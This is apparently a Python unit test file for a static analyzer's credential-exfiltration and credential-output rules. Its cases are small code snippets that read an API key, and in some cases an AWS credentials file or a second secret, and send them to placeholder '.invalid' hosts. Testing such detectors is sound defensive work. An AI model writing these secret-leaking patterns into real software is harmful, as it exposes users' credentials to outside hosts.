"""Construction-time URL purpose never replaces raw credential provenance."""
import unittest
from test_qindun_certify import MODULE


class PythonNamedUrlAuthTests(unittest.TestCase):
    def test_named_url_binding_boundaries(self):
        cases = [
            ("bound_fstring", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nrequests.get(url)", ["candidate"], False),
            ("bound_literal_format", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=\"https://service.invalid/api?key={}\".format(key)\nrequests.get(url)", ["candidate"], False),
            ("url_alias", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nold=url\nurl=\"https://public.invalid\"\nrequests.get(old)", ["candidate"], False),
            ("captured_secret_then_key_clear", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nkey=\"public\"\nrequests.get(url)", ["candidate"], False),
            ("captured_public_then_key_secret", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nkey=\"public\"\nurl=f\"https://service.invalid/api?key={key}\"\nkey=os.getenv(\"API_KEY\")\nrequests.get(url)", [], False),
            ("url_overwritten_payload", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nurl=key\nrequests.get(url)", ["confirmed"], False),
            ("url_body", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nrequests.post(\"https://other.invalid\",data=url)", ["confirmed"], False),
            ("url_output", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nrequests.get(url)\nprint(url)", ["candidate"], True),
            ("bound_request", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nreq=urllib.request.Request(url)\nresponse=urllib.request.urlopen(req)\nprint(response.url)", ["candidate"], True),
            ("mixed_sink", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nrequests.get(url)\nrequests.post(\"https://other.invalid\",data=key)", ["candidate","confirmed"], False),
            ("helper_construct", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\ndef fetch(key):\n    url=f\"https://service.invalid/api?key={key}\"\n    return requests.get(url)\nfetch(key)", ["candidate"], False),
            ("module_url_in_helper", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch():\n    return requests.get(url)\nfetch()", ["candidate"], False),
            ("module_rebind_between_calls", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\ndef fetch():\n    return requests.get(url)\nfetch()\nurl=key\nfetch()", ["confirmed"], False),
            ("branch_both_auth", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nif choose:\n    url=f\"https://service.invalid/api?key={key}\"\nelse:\n    url=f\"https://other.invalid/?token={key}\"\nrequests.get(url)", ["candidate"], False),
            ("branch_auth_or_payload", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nif choose:\n    url=f\"https://service.invalid/api?key={key}\"\nelse:\n    url=key\nrequests.get(url)", ["confirmed"], False),
            ("credential_file", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nkey=open(\".aws/credentials\").read()\nurl=f\"https://service.invalid/api?key={key}\"\nrequests.get(url)", ["confirmed"], False),
            ("mapping_query", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nkey={\"value\":key}\nurl=f\"https://service.invalid/api?key={key}\"\nrequests.get(url)", ["confirmed"], False),
            ("sequence_query", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nkey=[key]\nurl=f\"https://service.invalid/api?key={key}\"\nrequests.get(url)", ["confirmed"], False),
            ("changed_path", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/{model}?key={key}\"\nrequests.get(url)", ["confirmed"], False),
            ("changed_authority", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://{host}/api?key={key}\"\nrequests.get(url)", ["confirmed"], False),
            ("extra_field", "import os,requests,urllib.request\nkey=os.getenv(\"API_KEY\")\nurl=f\"https://service.invalid/api?key={key}\"\nurl+=\"&dump=\"+os.getenv(\"OTHER_SECRET\")\nrequests.get(url)", ["confirmed"], False),
        ]
        for name, source, expected, output in cases:
            with self.subTest(name=name):
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNone(error)
                self.assertEqual(
                    sorted({h.disposition for h in hits
                            if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}), expected
                )
                self.assertEqual(
                    any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits), output
                )

